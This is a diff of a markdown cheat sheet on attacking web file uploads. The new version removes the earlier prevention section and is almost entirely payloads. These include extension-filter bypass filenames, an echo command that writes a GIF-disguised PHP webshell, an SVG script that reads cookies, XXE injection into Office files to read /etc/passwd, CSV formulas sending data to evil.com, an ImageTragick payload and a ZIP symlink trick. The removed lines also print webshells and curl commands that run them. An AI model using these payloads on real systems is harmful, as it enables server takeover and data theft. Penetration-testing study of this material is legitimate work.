@@ -1,124 +1,92 @@
-# File Upload Vulnerabilities
+# File Upload Vulnerabilities: Beyond Shell Uploads
 
-File upload functionality is one of the most dangerous features in web applications. Improperly secured file uploads can lead to remote code execution, data breaches, and server compromise.
+## Bypassing Extension Filters
 
-## Common Vulnerabilities
-
-### Unrestricted File Upload
-Allowing any file type to be uploaded without validation.
+### Blacklist Bypass
 ```bash
-# Upload a PHP webshell
-POST /upload HTTP/1.1
-Content-Type: multipart/form-data
-file=<?php system($_GET['cmd']); ?>
+# Double extension
+file.php.jpg, file.php5, file.phtml, file.pht
+# Case variation
+file.PhP, file.ASP, file.JSP
+# Trailing characters
+file.php., file.php , file.php%00.jpg (null byte)
+# Apache-specific
+file.php%0a (newline in extension)
+file.php;.jpg (parameter in filename)
+.htaccess (override Apache config)
 ```
 
 ### Content-Type Bypass
-Only checking Content-Type header (client-controlled).
 ```http
-POST /upload HTTP/1.1
-Content-Type: multipart/form-data; boundary=----
-Content-Disposition: form-data; name="file"; filename="shell.php"
-Content-Type: image/jpeg        # Changed from text/php
+Content-Type: image/jpeg
+# Even if extension is .php, some parsers only check MIME
 ```
 
 ### Magic Byte Bypass
-Using file signatures to bypass content validation.
-```
-# GIF header + PHP code
-GIF89a<?php system($_GET['cmd']); ?>
-```
-
-### Extension Bypass Techniques
-
-| Technique | Example |
-|-----------|---------|
-| Double extension | `shell.php.jpg`, `shell.php;.jpg` |
-| Null byte injection | `shell.php%00.jpg` |
-| Case manipulation | `shell.PhP`, `shell.pHp` |
-| Reverse extension | `shell.jpg.php` |
-| Trailing characters | `shell.php.`, `shell.php ` |
-| Unicode/encoding | `shell%2Ephp` |
-| Config overrides | `.htaccess`, `web.config` |
-
-### Race Condition (Temporary Upload)
-Some applications upload files to a temporary directory before validation.
-- Upload + access before deletion
-- Tool: `race-the-web`
-
-## Server-Side Attacks
-
-### Webshell Upload
-```php
-<!-- PHP webshell -->
-<?php system($_GET['cmd']); ?>
-
-<!-- ASP webshell -->
-<% Execute("cmd.exe /c " & request("cmd")) %>
-
-<!-- JSP webshell -->
-<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
-```
-
-### .htaccess Overwrite
-```apache
-# Override configuration to execute .txt files as PHP
-AddType application/x-httpd-php .txt
-```
-
-### SVG Upload (XSS + SSRF)
-```xml
-<?xml version="1.0" standalone="no"?>
-<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
- "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
-<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
-```
-
-### XXE via XML Upload
-```xml
-<?xml version="1.0"?>
-<!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
-]>
-<doc>&xxe;</doc>
-```
-
-### ZIP Symlink
 ```bash
-# Create symlink in ZIP
-ln -s /etc/passwd link
-zip --symlinks evil.zip link
-# Upload + extract = access to /etc/passwd
+# Files beginning with GIF89a are valid GIFs regardless of extension
+echo "GIF89a<?php system(\$_GET['cmd']); ?>" > shell.php.gif
+# Upload works, then access via /uploads/shell.php.gif
 ```
 
-## ImageMagick / Image Processing Attacks
-- **ImageTragick** — RCE via malicious image files
-- **Decompression bombs** — Tiny image expands to gigabytes
-- **Pixel flood** — Excessive image dimensions
+## SVG Upload XSS
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
+  <script>alert(document.cookie)</script>
+</svg>
+```
 
-## Automated Detection
+## Office Document XXE
+
+Upload an XLSX/DOCX that contains XXE payloads:
 
 ```bash
-# Test upload endpoints with common web shells
-# Upload test file, check if accessible
-curl -F "file=@shell.php" https://target.com/upload/
-curl https://target.com/uploads/shell.php?cmd=id
-
-# Nuclei templates for file upload
-nuclei -t ~/nuclei-templates/vulnerabilities/generic/file-upload/
+# Use XXElixir to inject XXE into Office files
+python3 XXElixir.py --file template.xlsx --xxe '<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>' --output poisoned.xlsx
 ```
 
-## Prevention
+## File Content-Based Attacks
 
-1. **Allow-list file extensions** — Reject everything else
-2. **Validate content-type server-side** — Not from user input
-3. **Scan file content** — Use ClamAV or similar
-4. **Store files outside webroot** — Use secure storage (S3 with signed URLs)
-5. **Rename files on upload** — Use UUID-based filenames
-6. **Disable execution** in upload directories (noexec mount, .htaccess deny)
-7. **Limit file size** — Prevent DoS via large uploads
-8. **Check image dimensions** — Prevent decompression bombs
+### CSV Injection
+```csv
+=CMD('/C calc')
+@SUM(1+1)*cmd|' /C calc'!A0
++IMPORTXML(CONCATENATE("https://evil.com/?data=",A1),"//*")
+```
 
----
+### PDF Upload SSRF
+```bash
+# Craft PDF with embedded URL fetch
+# Some PDF processors resolve external references
+```
 
-> **Next**: [Server-Side Template Injection (SSTI)](11-ssti.md)
+## Server-Side Processing Vulnerabilities
+
+```bash
+# ImageMagick RCE (ImageTragick)
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://evil.com/test.jpg)'
+pop graphic-context
+# FFmpeg SSRF (via malicious HLS playlist or subtitle file)
+```
+
+## ZIP Symlink Attack
+
+```bash
+# Create ZIP containing symlink to /etc/passwd
+ln -s /etc/passwd symlink_target
+zip --symlinks evil.zip symlink_target
+# Upload → server extracts → can read /etc/passwd via the symlink
+```
+
+## Detection Checklist
+
+1. Can you upload non-image files by changing extension?
+2. Is the upload stored inside web root? (Find the URL)
+3. Is the filename user-controlled before storage?
+4. Are uploaded files served with Content-Disposition: attachment?
+5. Is there a file size limit? (Large uploads may not be validated for content)
+6. Is there a virus scanner? (It may have bypasses)
+7. Does the app re-encode/render uploaded media? (ImageMagick/FFmpeg bugs)
